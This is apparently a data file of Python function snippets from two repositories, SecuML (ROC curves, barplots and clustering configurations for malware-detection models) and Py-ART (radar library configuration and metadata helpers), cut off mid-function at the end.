ANSSI-FR/SecuML,add_fold,"def add_fold(self, fold_id, predictions):
    if predictions.num_instances() == 0 or sum(predictions.ground_truth) == 0:
        return
    if self.probabilist:
        scores = predictions.probas
    else:
        scores = predictions.scores
    (fpr, tpr, thresholds) = roc_curve(predictions.ground_truth, scores)
    thresholds = np.append(1, thresholds)
    fpr = np.append(0, fpr)
    tpr = np.append(0, tpr)
    thresholds = np.append(thresholds, 0)
    fpr = np.append(fpr, 1)
    tpr = np.append(tpr, 1)
    if self.mean_tpr is None:
        self.mean_tpr = interp(self.mean_fpr, fpr, tpr)
    else:
        self.mean_tpr += interp(self.mean_fpr, fpr, tpr)
    self.thresholds = interp(self.mean_fpr, fpr, thresholds)
    roc_auc = auc(fpr, tpr)
    if self.num_folds > 1:
        self.ax1.plot(fpr, tpr, lw=1, label='ROC fold %d (area = %0.2f)' % (fold_id, roc_auc))
    else:
        self.ax1.plot(fpr, tpr, lw=3, color=get_label_color('all'), label='ROC (area = %0.2f)' % roc_auc)
    return (fpr, tpr, roc_auc)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    self.plot(path.join(directory, 'ROC.png'))
    self.to_csv(path.join(directory, 'ROC.csv'))"
ANSSI-FR/SecuML,plot,"def plot(self, output_file):
    self.ax1.plot([0, 1], [0, 1], '--', lw=1, color=(0.6, 0.6, 0.6), label='Luck')
    if self.num_folds > 1:
        self.mean_tpr /= self.num_folds
        mean_auc = auc(self.mean_fpr, self.mean_tpr)
        self.ax1.plot(self.mean_fpr, self.mean_tpr, 'k--', label='Mean ROC (area = %0.2f)' % mean_auc, lw=2)
    self.ax1.set_xlim([-0.05, 1.05])
    self.ax1.set_ylim([-0.05, 1.05])
    self.ax1.set_xlabel('False Positive Rate')
    self.ax1.set_ylabel('True Positive Rate (Detection Rate)')
    self.ax1.set_title('ROC Curve')
    self.ax1.legend(loc='lower right')
    self.fig.savefig(output_file)
    plt.close(self.fig)"
ANSSI-FR/SecuML,to_csv,"def to_csv(self, output_file):
    with open(output_file, 'w') as f:
        csv_writer = csv.writer(f)
        header = ['Threshold', 'False Alarm Rate', 'Detection Rate']
        csv_writer.writerow(header)
        if self.thresholds is None:
            return
        for i in range(len(self.mean_fpr)):
            row = [self.thresholds[i], self.mean_fpr[i], self.mean_tpr[i]]
            csv_writer.writerow(row)"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_folds):
    self.logger = logger
    self.num_folds = num_folds
    self.predictions = None
    self.barplot = None
    self.num_added_folds = 0"
ANSSI-FR/SecuML,add_fold,"def add_fold(self, predictions):
    self.num_added_folds += 1
    if self.num_added_folds > self.num_folds:
        raise AddTooManyFolds()
    if self.predictions is None:
        if self.num_folds > 1:
            self.predictions = Predictions.deepcopy(predictions)
        else:
            self.predictions = predictions
    else:
        self.predictions.union(predictions)"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    if self.num_folds != self.num_added_folds:
        raise FoldsNotAdded()
    pred_info = self.predictions.info
    if not pred_info.multiclass and pred_info.with_probas:
        self.barplot = ProbaBarplot(pred_info.with_ground_truth)
    elif not pred_info.multiclass and pred_info.with_scores:
        self.barplot = ScoreBarplot(pred_info.with_ground_truth, self.logger)
    else:
        self.barplot = PredictionBarplot(pred_info.with_ground_truth)
    self.barplot.set_predictions(self.predictions)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    self.barplot.display(directory)"
ANSSI-FR/SecuML,__init__,"def __init__(self, has_ground_truth):
    self.predictions = {}
    self.multiclass = None
    self.has_ground_truth = has_ground_truth"
ANSSI-FR/SecuML,set_predictions,"def set_predictions(self, predictions):
    if self.multiclass is None:
        self.multiclass = predictions.info.multiclass
    elif self.multiclass != predictions.info.multiclass:
        raise InconsistentPredictions()
    for (instance_id, prediction, label) in zip(predictions.ids.ids, predictions.values, predictions.ground_truth):
        if prediction not in self.predictions:
            self.predictions[prediction] = []
        self.predictions[prediction].append({'instance_id': instance_id, 'ground_truth_label': label})"
ANSSI-FR/SecuML,_display,"def _display(self, barplot, labels, error=None):
    if error is not None:
        values = [len([p for p in self.predictions[l] if (p['ground_truth_label'] == l) != error]) for l in labels]
        label = 'wrong predictions' if error else 'right predictions'
    else:
        values = [len(self.predictions[l]) for l in labels]
        label = 'all'
    dataset = PlotDataset(np.array(values), label)
    dataset.set_color(get_error_color(error))
    barplot.add_dataset(dataset)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    labels = list(self.predictions.keys())
    if self.multiclass:
        xlabels = labels
    else:
        xlabels = [label_bool_to_str(l) for l in labels]
    barplot = BarPlot(xlabels)
    if not self.has_ground_truth:
        self._display(barplot, labels)
    else:
        self._display(barplot, labels, error=False)
        self._display(barplot, labels, error=True)
    barplot.export_to_json(path.join(directory, 'pred_barplot.json'))"
ANSSI-FR/SecuML,__init__,"def __init__(self, has_ground_truth):
    self.ranges = [[] for i in range(10)]
    self.labels = ['0-10%', '10-20%', '20-30%', '30-40%', '40-50%', '50-60%', '60-70%', '70-80%', '80-90%', '90-100%']
    self.has_ground_truth = has_ground_truth"
ANSSI-FR/SecuML,set_predictions,"def set_predictions(self, predictions):
    for (instance_id, proba, label) in zip(predictions.ids.ids, predictions.probas, predictions.ground_truth):
        if proba == 1:
            proba = 0.999999
        self.ranges[int(proba * 10)].append({'instance_id': instance_id, 'ground_truth_label': label})"
ANSSI-FR/SecuML,display_label,"def display_label(self, barplot, label):
    if label != 'all':
        label_bool = label_str_to_bool(label)
        ranges = [[x for x in l if x['ground_truth_label'] == label_bool] for l in self.ranges]
    else:
        ranges = self.ranges
    dataset = PlotDataset(np.array([len(r) for r in ranges]), label)
    dataset.set_color(get_label_color(label))
    barplot.add_dataset(dataset)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    barplot = BarPlot(self.labels)
    if not self.has_ground_truth:
        self.display_label(barplot, 'all')
    else:
        self.display_label(barplot, MALICIOUS)
        self.display_label(barplot, BENIGN)
    barplot.export_to_json(path.join(directory, 'pred_barplot.json'))"
ANSSI-FR/SecuML,__init__,"def __init__(self, has_ground_truth, logger):
    self.has_ground_truth = has_ground_truth
    self.logger = logger
    self.predictions = None
    self.datasets = None"
ANSSI-FR/SecuML,set_predictions,"def set_predictions(self, predictions):
    self.predictions = predictions
    self.datasets = {}
    if not self.has_ground_truth:
        self.datasets['all'] = PlotDataset(predictions.scores, 'all')
    else:
        for label in [MALICIOUS, BENIGN]:
            label_bool = label_str_to_bool(label)
            scores = [predictions.scores[i] for i in range(predictions.num_instances()) if predictions.ground_truth[i] == label_bool]
            self.datasets[label] = PlotDataset(np.array(scores), label)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    barplot = Histogram(self.datasets, self.logger)
    barplot.export_to_json(path.join(directory, 'pred_barplot.json'))"
ANSSI-FR/SecuML,get_factory,"def get_factory():
    global clustering_conf_factory
    if clustering_conf_factory is None:
        clustering_conf_factory = ClusteringConfFactory()
    return clustering_conf_factory"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_clusters, projection_conf=None):
    Conf.__init__(self, logger)
    self.num_clusters = num_clusters
    self.projection_conf = projection_conf
    self.algo = None"
ANSSI-FR/SecuML,set_num_clusters,"def set_num_clusters(self, num_clusters):
    self.num_clusters = num_clusters"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = self.algo.__name__
    if self.num_clusters is not None:
        name += '__num_clusters_%d' % self.num_clusters
    if self.projection_conf is not None:
        name += '__%s' % self.projection_conf.get_exp_name()
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('num_clusters', exportFieldMethod.primitive), ('projection_conf', exportFieldMethod.obj), ('algo', exportFieldMethod.obj_class)]"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--num-clusters', type=int, help='Number of clusters. Default: 4.', default=4)
    projection_group = parser.add_argument_group('Projection parameters')
    projection_group.add_argument('--projection-algo', choices=projection_conf.get_factory().get_methods() + [None], default=None, help='Projection performed before building the clustering.\n                        By default the instances are not projected.')
    projection_group.add_argument('--multiclass', action='store_true', default=False, help='When specified, the semi-supervision is based on\n                        the families instead of the binary labels.\n                        Useless if an unsupervised projection method is\n                        used.')
    projection_group.add_argument('--num-components', type=int, default=None, help='Number of components. Default: None,\n                                    the number of components is set to the\n                                    number of input features. ')"
ANSSI-FR/SecuML,proj_conf_from_args,"@staticmethod
def proj_conf_from_args(args, logger):
    if not hasattr(args, 'projection_algo') or args.projection_algo is None:
        return None
    proj_factory = projection_conf.get_factory()
    proj_conf = proj_factory.from_args(args.projection_algo, args, logger)
    return proj_conf"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, proj_conf, logger):
    return ClusteringConf(logger, obj['num_clusters'], projection_conf=proj_conf)"
ANSSI-FR/SecuML,from_args,"def from_args(self, method, args, logger):
    if not hasattr(args, 'projection_algo') or args.projection_algo is None:
        proj_conf = None
    else:
        proj_factory = projection_conf.get_factory()
        proj_conf = proj_factory.from_args(args.projection_algo, args, logger)
    class_ = self.methods[method + 'Conf']
    return class_.from_args(args, proj_conf, logger)"
ANSSI-FR/SecuML,from_json,"def from_json(self, obj, logger):
    proj_conf = None
    if obj['projection_conf'] is not None:
        proj_factory = projection_conf.get_factory()
        proj_conf = proj_factory.from_json(obj['projection_conf'], logger)
    class_ = self.methods[obj['__type__']]
    return class_.from_json(obj, proj_conf, logger)"
ANSSI-FR/SecuML,get_methods,"def get_methods(self):
    algos = ConfFactory.get_methods(self)
    algos.remove('Clustering')
    return algos"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, metric, projection_conf=None):
    ClusteringConf.__init__(self, logger, None, projection_conf=projection_conf)
    self.algo = Dbscan
    self.metric = metric"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ClusteringConf.fields_to_export(self)
    fields.append(('metric', exportFieldMethod.primitive))
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    ClusteringConf.gen_parser(parser)
    parser.add_argument('--metric', choices=['euclidean', 'cosine'], default='euclidean')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, proj_conf, logger):
    return DbscanConf(logger, args.metric, projection_conf=proj_conf)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, proj_conf, logger):
    return DbscanConf(logger, obj['metric'], projection_conf=proj_conf)"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_clusters, projection_conf=None):
    ClusteringConf.__init__(self, logger, num_clusters, projection_conf=projection_conf)
    self.algo = GaussianMixture
    self.covariance_type = 'diag'
    self.init_params = 'kmeans'
    self.max_iter = 2"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, proj_conf, logger):
    return GaussianMixtureConf(logger, args.num_clusters, proj_conf)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, proj_conf, logger):
    return GaussianMixtureConf(logger, obj['num_clusters'], proj_conf)"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_clusters, projection_conf=None):
    ClusteringConf.__init__(self, logger, num_clusters, projection_conf=projection_conf)
    self.algo = Kmeans"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, proj_conf, logger):
    return KmeansConf(logger, args.num_clusters, proj_conf)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, proj_conf, logger):
    return KmeansConf(logger, obj['num_clusters'], proj_conf)"
ANSSI-FR/SecuML,get_factory,"def get_factory():
    global projection_conf_factory
    if projection_conf_factory is None:
        projection_conf_factory = ProjectionConfFactory()
    return projection_conf_factory"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_components):
    Conf.__init__(self, logger)
    self.num_components = num_components
    self._set_algo()"
ANSSI-FR/SecuML,_get_algo,"@abc.abstractmethod
def _get_algo(self):
    return"
ANSSI-FR/SecuML,_set_algo,"def _set_algo(self):
    self.algo = self._get_algo()
    self.algo_name = self.algo.__name__"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return self.algo.__name__"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('algo', exportFieldMethod.obj_class), ('num_components', exportFieldMethod.primitive)]"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--num-components', type=int, default=None, help='Number of components. Default: None,\n                                    the number of components is set to the\n                                    number of input features. ')"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger, num_components=None, multiclass=None):
    ProjectionConf.__init__(self, logger, num_components)
    self.multiclass = multiclass"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    suffix = ProjectionConf.get_exp_name(self)
    if self.multiclass:
        suffix += '__multiclass'
    return suffix"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ProjectionConf.fields_to_export(self)
    fields.extend([('multiclass', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    ProjectionConf.gen_parser(parser)
    parser.add_argument('--multiclass', action='store_true', default=False, help='When specified, the semi-supervision is based on\n                         the families instead of the binary labels. ')"
ANSSI-FR/SecuML,_get_algo,"def _get_algo(self):
    return Itml"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return ItmlConf(logger, obj['num_components'], obj['multiclass'])"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return ItmlConf(logger, args.multiclass)"
ANSSI-FR/SecuML,_get_algo,"def _get_algo(self):
    return Lda"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return LdaConf(logger, args.num_components, args.multiclass)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return LdaConf(logger, obj['num_components'], obj['multiclass'])"
ANSSI-FR/SecuML,_get_algo,"def _get_algo(self):
    return Lmnn"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return LmnnConf(logger, obj['num_components'], obj['multiclass'])"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return LmnnConf(logger, multiclass=args.multiclass)"
ANSSI-FR/SecuML,_get_algo,"def _get_algo(self):
    return Nca"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return NcaConf(logger, obj['num_components'], obj['multiclass'])"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return NcaConf(logger, args.num_components, args.multiclass)"
ANSSI-FR/SecuML,_get_algo,"def _get_algo(self):
    return Pca"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return PcaConf(logger, args.num_components)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return PcaConf(logger, obj['num_components'])"
ANSSI-FR/SecuML,_get_algo,"def _get_algo(self):
    return Rca"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return RcaConf(logger, obj['num_components'], obj['multiclass'])"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return RcaConf(logger, args.num_components, args.multiclass)"
ANSSI-FR/SecuML,_get_algo,"def _get_algo(self):
    return Sdml"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return SdmlConf(logger, obj['num_components'], obj['multiclass'])"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return SdmlConf(logger, multiclass=args.multiclass)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp, classifier_conf, features_info, class_label, num_folds=1):
    ClassCoefficientsCore.__init__(self, features_info, class_label, num_folds=num_folds)
    self.exp = exp
    self.classifier_conf = classifier_conf"
ANSSI-FR/SecuML,to_barplot,"def to_barplot(self, directory):
    head_coeff = self.coef_summary.head(n=NUM_COEFF_EXPORT)
    coefficients = head_coeff['mean'].values
    features_ids = list(head_coeff.index)
    features_names = []
    user_ids = []
    for feature_id in features_ids:
        query = self.exp.session.query(FeaturesAlchemy)
        query = query.filter(FeaturesAlchemy.id == int(feature_id))
        row = query.one()
        features_names.append(row.name)
        user_ids.append(row.user_id)
    barplot = BarPlot(user_ids)
    dataset = PlotDataset(coefficients, None)
    score = self.classifier_conf.get_feature_importance()
    if score == 'weight':
        dataset.set_color(red)
    else:
        dataset.set_color(blue)
    barplot.add_dataset(dataset)
    if self.class_label is None:
        out_filename = 'coeff_barplot.json'
    else:
        out_filename = 'coeff_barplot_%s.json' % self.class_label
    return barplot.export_to_json(path.join(directory, out_filename), tooltip_data=features_names)"
ANSSI-FR/SecuML,display,"def display(self, directory):
    ClassCoefficientsCore.display(self, directory)
    self.to_barplot(directory)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp, classifier_conf, class_labels, num_folds=1):
    features_info = exp.exp_conf.features_conf.info
    self.exp = exp
    self.classifier_conf = classifier_conf
    CoefficientsCore.__init__(self, features_info, class_labels, num_folds=num_folds)"
ANSSI-FR/SecuML,_init_class_coefficients,"def _init_class_coefficients(self, features_info, num_folds):
    if self.class_labels is None:
        self.coefficients = ClassCoefficients(self.exp, self.classifier_conf, features_info, None, num_folds=num_folds)
    else:
        self.coefficients = {label: ClassCoefficients(self.exp, self.classifier_conf, features_info, label, num_folds=num_folds) for label in self.class_labels}"
ANSSI-FR/SecuML,get_factory,"def get_factory():
    global objective_func_conf_factory
    if objective_func_conf_factory is None:
        objective_func_conf_factory = ObjectiveFuncConfFactory()
    return objective_func_conf_factory"
ANSSI-FR/SecuML,get_scoring_method,"@abc.abstractmethod
def get_scoring_method(self):
    return"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    factory = get_factory()
    methods = factory.get_methods()
    parser.add_argument('--objective-func', choices=methods, default='RocAuc', help='Default: RocAuc. ')
    for method in methods:
        factory.gen_parser(method, parser)"
ANSSI-FR/SecuML,get_scoring_method,"def get_scoring_method(self):
    return 'accuracy'"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    return"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return AccuracyConf(logger)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return AccuracyConf(logger)"
ANSSI-FR/SecuML,detection_rate_at_fdr,"def detection_rate_at_fdr(ground_truth, scores, far):
    precision_sample = np.linspace(0, 1, 101)
    (recall, _) = interp_recall(ground_truth, scores, precision_sample)
    return recall[100 - int(far * 100)]"
ANSSI-FR/SecuML,__init__,"def __init__(self, far, logger):
    ObjectiveFuncConf.__init__(self, logger)
    self.far = far"
ANSSI-FR/SecuML,get_scoring_method,"def get_scoring_method(self):
    return make_scorer(detection_rate_at_fdr, greater_is_better=True, needs_threshold=True, far=self.far)"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ObjectiveFuncConf.fields_to_export(self)
    fields.extend([('far', exportFieldMethod.primitive)])"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--far', type=float, default=0.05, help='False Alarm Rate (FAR) for which the Detection Rate (DR) should be optimized.')"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return DrAtFarConf(obj['far'], logger)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return DrAtFarConf(args.far, logger)"
ANSSI-FR/SecuML,ndcg,"def ndcg(ground_truth, scores, pos_label=1):
    df = pd.DataFrame({'scores': scores, 'ground_truth': ground_truth, 'index': [0] * len(scores)})
    sort_data_frame(df, 'scores', False, True)
    df.loc[:, 'index'] = range(len(scores))
    selection = df.loc[:, 'ground_truth'] == pos_label
    df = df.loc[selection, :]
    score = sum([pow(2, -row['index']) for (_, row) in df.iterrows()])
    ideal_score = sum([pow(2, -i) for i in range(len(scores))])
    return score / ideal_score"
ANSSI-FR/SecuML,get_scoring_method,"def get_scoring_method(self):
    return make_scorer(ndcg, greater_is_better=True, needs_threshold=True)"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    return"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return NdcgConf(logger)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return NdcgConf(logger)"
ANSSI-FR/SecuML,get_scoring_method,"def get_scoring_method(self):
    return 'roc_auc'"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    return"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    return RocAucConf(logger)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return RocAucConf(logger)"
ARM-DOE/pyart,guess_rsl_path,"def guess_rsl_path():
    return {'darwin': '/usr/local/trmm', 'linux2': '/usr/local/trmm', 'linux': '/usr/local/trmm', 'win32': 'XXX'}[sys.platform]"
ARM-DOE/pyart,check_rsl_path,"def check_rsl_path(rsl_lib_path, rsl_include_path):
    ext = {'darwin': 'dylib', 'linux2': 'so', 'linux': 'so', 'win32': 'DLL'}[sys.platform]
    lib_file = os.path.join(rsl_lib_path, 'librsl.' + ext)
    if os.path.isfile(lib_file) is False:
        return False
    inc_file = os.path.join(rsl_include_path, 'rsl.h')
    if os.path.isfile(inc_file) is False:
        return False
    return True"
ARM-DOE/pyart,_debug_info,"def _debug_info(stream=None):
    """"""
    Print out version and status information for debugging.

    This file can be run as a script from the source directory to report on
    dependecies before a build using: **python pyart/_debug_info.py**.

    Parameters
    ----------
    stream : file-like object
        Stream to print the information to, None prints to sys.stdout.

    """"""
    if stream is None:
        stream = sys.stdout
    current_dir = os.path.dirname(os.path.abspath(__file__))
    if current_dir in sys.path:
        sys.path.remove(current_dir)
    try:
        import pyart
        pyart_version = pyart.__version__
    except:
        pyart_version = 'MISSING'
    try:
        import platform
        python_version = platform.python_version()
    except:
        python_version = 'MISSING'
    try:
        import numpy
        numpy_version = numpy.__version__
    except:
        numpy_version = 'MISSING'
    try:
        import scipy
        scipy_version = scipy.__version__
    except:
        scipy_version = 'MISSING'
    try:
        import matplotlib
        matplotlib_version = matplotlib.__version__
    except:
        matplotlib_version = 'MISSING'
    try:
        import netCDF4
        netCDF4_version = netCDF4.__version__
    except:
        netCDF4_version = 'MISSING'
    try:
        import cylp
        cylp_available = 'Available'
    except:
        cylp_available = 'MISSING'
    try:
        import glpk
        glpk_version = '%i.%i' % glpk.env.version
    except:
        glpk_version = 'MISSING'
    try:
        import cvxopt.info
        cvxopt_version = cvxopt.info.version
    except:
        cvxopt_version = 'MISSING'
    try:
        import cartopy
        cartopy_version = cartopy.__version__
    except:
        cartopy_version = 'MISSING'
    try:
        import pytest
        pytest_version = pytest.__version__
    except:
        pytest_version = 'MISSING'
    print('Py-ART version:', pyart_version, file=stream)
    print('', file=stream)
    print('---- Dependencies ----', file=stream)
    print('Python version:', python_version, file=stream)
    print('NumPy version:', numpy_version, file=stream)
    print('SciPy version:', scipy_version, file=stream)
    print('matplotlib version:', matplotlib_version, file=stream)
    print('netCDF4 version:', netCDF4_version, file=stream)
    print('', file=stream)
    print('---- Optional dependencies ----', file=stream)
    print('CyLP:', cylp_available, file=stream)
    print('PyGLPK version:', glpk_version, file=stream)
    print('CVXOPT version:', cvxopt_version, file=stream)
    print('Cartopy version:', cartopy_version, file=stream)
    print('pytest version:', pytest_version, file=stream)"
ARM-DOE/pyart,load_config,"def load_config(filename=None):
    """"""
    Load a Py-ART configuration from a config file.

    The default values for a number of Py-ART parameters and metadata is
    controlled by a single Python configuration file. An self-descriping
    example of this file can be found in the Py-ART source directory named
    **default_config.py**. These defaults can modified by setting the
    environmental variable `PYART_CONFIG` to point to a new configuration
    file. If this variable is not set then the settings contained in
    the **default_config.py** file are used.

    The code the configuration file is executed as-is with full permission,
    this may present a security issue, do not load un-trusted configuration
    files.

    The recommended method for changing these defaults is for users to
    copy this file into their home directory, rename it to .pyart_config.py,
    make any changes, and adjust their login scripts to set the PYART_CONFIG
    environmental variable to point to .pyart_config.py in their home
    directory.

    Py-ART's configuration can also be modified within a script or shell
    session using this function, the modification will last until a the end
    of the script/session or until a new configuration is loaded.

    Parameters
    ----------
    filename : str
        Filename of configuration file. If None the default configuration
        file is loaded from the Py-ART source code directory.

    """"""
    if filename is None:
        filename = _DEFAULT_CONFIG_FILE
    global _DEFAULT_METADATA
    global _FILE_SPECIFIC_METADATA
    global _FIELD_MAPPINGS
    global _FILL_VALUE
    global _DEFAULT_FIELD_NAMES
    global _DEFAULT_FIELD_COLORMAP
    global _DEFAULT_FIELD_LIMITS
    try:
        from importlib.util import module_from_spec, spec_from_file_location
        spec = spec_from_file_location('metadata_config', filename)
        cfile = module_from_spec(spec)
        spec.loader.exec_module(cfile)
    except ImportError:
        import imp
        cfile = imp.load_source('metadata_config', filename)
    _DEFAULT_METADATA = cfile.DEFAULT_METADATA
    _FILE_SPECIFIC_METADATA = cfile.FILE_SPECIFIC_METADATA
    _FIELD_MAPPINGS = cfile.FIELD_MAPPINGS
    _FILL_VALUE = cfile.FILL_VALUE
    _DEFAULT_FIELD_NAMES = cfile.DEFAULT_FIELD_NAMES
    try:
        _DEFAULT_FIELD_COLORMAP = cfile.DEFAULT_FIELD_COLORMAP
        _DEFAULT_FIELD_LIMITS = cfile.DEFAULT_FIELD_LIMITS
    except:
        pass
    return"
ARM-DOE/pyart,get_metadata,"def get_metadata(p):
    """"""
    Return a dictionary of metadata for a given parameter, p.

    An empty dictionary will be returned in no metadata dictionary exists for
    parameter p.
    """"""
    if p in _DEFAULT_METADATA:
        return _DEFAULT_METADATA[p].copy()
    else:
        return {}"
ARM-DOE/pyart,get_fillvalue,"def get_fillvalue():
    """"""
    Return the current fill value.
    """"""
    return _FILL_VALUE"
ARM-DOE/pyart,get_field_name,"def get_field_name(field):
    """"""
    Return the field name from the configuration file for a given field.
    """"""
    return str(_DEFAULT_FIELD_NAMES[field])"
ARM-DOE/pyart,get_field_colormap,"def get_field_colormap(field):
    """"""
    Return the colormap name from the configuration file for a field name.
    """"""
    if field in _DEFAULT_FIELD_COLORMAP:
        return _DEFAULT_FIELD_COLORMAP[field]
    else:
        import matplotlib.cm
        return matplotlib.cm.get_cmap().name"
ARM-DOE/pyart,get_field_limits,"def get_field_limits(field, container=None, selection=0):
    """"""
    Return the data limits from the configuration file for a given field,
    radar and sweep.

    Parameters
    ----------
    field : str
        Field name.
    container : Radar, Grid or None, optional
        This is an optional parameter that will be use to get informations
        related to the field, like for instace nyquist velocity.
    selection : int, optional
        Selection of the data in the container, case container is a Radar this
        is the sweep to be considered.

    Returns
    -------
    vmin, vmax: 2-tuplet of float
        Minimun and Maximun teorical value for field, if field is not
        in the configuration file returns (None, None).

    """"""
    if field in _DEFAULT_FIELD_LIMITS:
        limits = _DEFAULT_FIELD_LIMITS[field]
        if callable(limits):
            limits = limits(container, selection)
        return limits
    else:
        return (None, None)"
ARM-DOE/pyart,get_field_mapping,"def get_field_mapping(filetype):
    """"""
    Return a copy of the default field mapping for a given file type.

    Parameters
    ----------
    filetype : str
        Filetype to return field mappings for.

    Returns
    -------
    field_mappings : dict
        Dictionary mapping field names from one type to another.

    """"""
    return _FIELD_MAPPINGS[filetype].copy()"
ARM-DOE/pyart,__init__,"def __init__(self, filetype, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None):
    """"""
        Initialize.
        """"""
    if filetype in _FILE_SPECIFIC_METADATA:
        self._file_specific_metadata = _FILE_SPECIFIC_METADATA[filetype]
    else:
        self._file_specific_metadata = {}
    if additional_metadata is None:
        self._additional_metadata = {}
    else:
        self._additional_metadata = additional_metadata
    if file_field_names:
        self._field_names = None
    elif field_names is None and filetype in _FIELD_MAPPINGS:
        self._field_names = _FIELD_MAPPINGS[filetype]
    else:
        self._field_names = field_names
    if exclude_fields is None:
        self._exclude_fields = []
    else:
        self._exclude_fields = exclude_fields
    if include_fields is None:
        self._include_fields = None
    else:
        self._include_fields = include_fields"
ARM-DOE/pyart,get_metadata,"def get_metadata(self, p):
    """"""
        Retrieve metadata for a parameter `p`.

        Parameters
        ----------
        p : str
            Parameter to retrieve metadata for.

        Returns
        -------
        dic : dict
            Dictionary of metadata for the parameter.

        """"""
    if p in self._additional_metadata:
        return self._additional_metadata[p].copy()
    elif p in self._file_specific_metadata:
        return self._file_specific_metadata[p].copy()
    elif p in _DEFAULT_METADATA:
        return _DEFAULT_METADATA[p].copy()
    else:
        return {}"
ARM-DOE/pyart,__call__,"def __call__(self, p):
    """"""
        Retrieve metadata for parameter `p`.
        """"""
    return self.get_metadata(p)"
ARM-DOE/pyart,get_field_name,"def get_field_name(self, file_field_name):
    """"""
        Return the name radar field for a given file field name

        Parameters
        ----------
        file_field_name : str
            Field name in file being read.

        Returns
        -------
        field_name : str or None
            Field name in radar object fields dictionary, None indicated
            that the field should not be included.

        """"""
    if self._field_names is None:
        field_name = file_field_name
    elif file_field_name in self._field_names:
        field_name = self._field_names[file_field_name]
    else:
        return None
    if field_name in self._exclude_fields:
        return None
    elif self._include_fields is not None:
        if field_name not in self._include_fields:
            return None
        else:
            return field_name
    else:
        return field_name"
ARM-DOE/pyart,velocity_limit,"def velocity_limit(container=None, selection=0):
    import pyart
    if isinstance(container, pyart.core.Radar):
        try:
            if selection >= 0 and selection < container.nsweeps:
                vel = container.get_nyquist_vel(selection, check_uniform=False)
            else:
                vel = container.get_nyquist_vel(0, check_uniform=False)
            return (-vel, vel)
        except LookupError:
            return (-30.0, 30.0)
    else:
        return (-30.0, 30.0)"
ARM-DOE/pyart,spectrum_width_limit,"def spectrum_width_limit(container=None, selection=0):
    import pyart
    if isinstance(container, pyart.core.Radar):
        try:
            if selection >= 0 and selection < container.nsweeps:
                vel = container.get_nyquist_vel(selection, check_uniform=False)
            else:
